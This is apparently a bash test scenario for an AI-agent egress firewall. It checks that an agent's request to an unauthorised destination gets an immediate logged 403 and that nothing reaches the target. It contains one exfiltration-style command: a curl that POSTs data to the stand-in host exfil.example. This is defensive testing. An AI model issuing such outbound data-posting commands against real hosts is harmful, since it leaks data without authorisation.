#!/usr/bin/env bash
# 01 — Refus immédiat et explicite (EF-21, cahier §8) : laurent-bot (zone internes) appelle une destination
# non autorisée ; la passerelle répond tout de suite 403 + X-Agents-Firewall: denied + message exact, rien
# n'arrive chez la cible, et le refus est dans le journal avec la règle.
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 01-refus-immediat "Refus immédiat et explicite d'une destination non autorisée"
require_demo laurent-bot
positive_control laurent-bot
since="$(now_iso)"; marker="s01-$(rand_hex)"

t0="$(now_ms)"
out="$(agent_sh laurent-bot "curl -sS -i --max-time 10 -d '$marker' https://exfil.example/upload" 2>&1 || true)"
elapsed=$(( $(now_ms) - t0 ))
status="$(printf '%s' "$out" | sed -n 's/^HTTP\/[0-9.]* \([0-9]*\).*/\1/p' | tail -n1)"
evidence "HTTP $status in ${elapsed} ms"
evidence "header: $(printf '%s' "$out" | grep -i '^x-agents-firewall:' | tr -d '\r' || echo none)"
body="$(printf '%s' "$out" | tr -d '\r' | sed -n '/^$/,$p' | sed '1d' | tail -n1)"
evidence "body: $body"

[ "$status" = 403 ] || fail "expected HTTP 403, got '${status:-none}'"
printf '%s' "$out" | grep -qi '^x-agents-firewall: *denied' || fail "header X-Agents-Firewall: denied missing"
printf '%s' "$body" | grep -Eq '^blocked by agents-firewall: exfil\.example(:443)? not allowed for laurent-bot \(rule [0-9]+\)$' ||
  fail "unexpected denial body"
[ "$elapsed" -lt 2000 ] || fail "denial took ${elapsed} ms (expected immediate, < 2 s)"
upstream_received exfil "$marker" && fail "the request reached exfil.example"
evidence "exfil.example received nothing"

flow="$(find_flow "$(agent_id laurent-bot)" exfil.example deny "$since")" || fail "no deny flow in the log"
evidence "log: flow $(printf '%s' "$flow" | jqx -r '.id') rule #$(printf '%s' "$flow" | jqx -r '.decision.rule_number') ($(printf '%s' "$flow" | jqx -r '.decision.reason'))"
pass "403 explicite en ${elapsed} ms, journalisé, rien reçu par la cible"
